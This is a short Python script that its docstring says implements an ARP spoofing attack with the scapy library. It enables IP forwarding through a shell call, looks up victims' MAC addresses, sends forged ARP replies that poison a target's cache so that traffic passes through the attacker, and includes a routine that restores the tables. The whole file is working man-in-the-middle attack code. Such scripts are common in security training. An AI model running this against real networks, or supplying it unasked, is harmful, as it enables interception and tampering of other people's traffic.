""" This program implements the ARP Spoofing attack """
#!/usr/bin/env python

import scapy.all as scapy
import subprocess

def IP_forwarding(value):
    # Enabling IP forwarding before starting the attack
    subprocess.call("echo %s > /proc/sys/net/ipv4/ip_forward" %value, shell=True)

def scan(ip):
    # IP Packet
    ip_packet = scapy.ARP(pdst=ip)

    # Ethernet Frame
    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combining above two to make an ARP request for set IP/range and broadcast MAC
    arp_request = ether_frame/ip_packet

    # Send and Receive the protocol created above. By default returns two lists [answered, unanswered]. We capture only answered ones
    answered = scapy.srp(arp_request, timeout=1, verbose=False)[0] # Using srp instead of scapy.sr because we have custom made Ethernet frame
    return answered[0][1].hwsrc

def arp_spoof(target, spoof):
    mac = scan(target) # Getting MAC of the victim (Access Point or device turn by turn)
    spoof_victim = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoof)
    scapy.send(spoof_victim, verbose=False)

def restore(destination, source):
    mac_dst = scan(destination) # Getting MAC of the dst and src device turn by turn
    mac_src = scan(source)
    restore_flow = scapy.ARP(op=2, hwdst=mac_dst, pdst=destination, hwsrc=mac_src, psrc=source)
    scapy.send(restore_flow, count=4, verbose=False)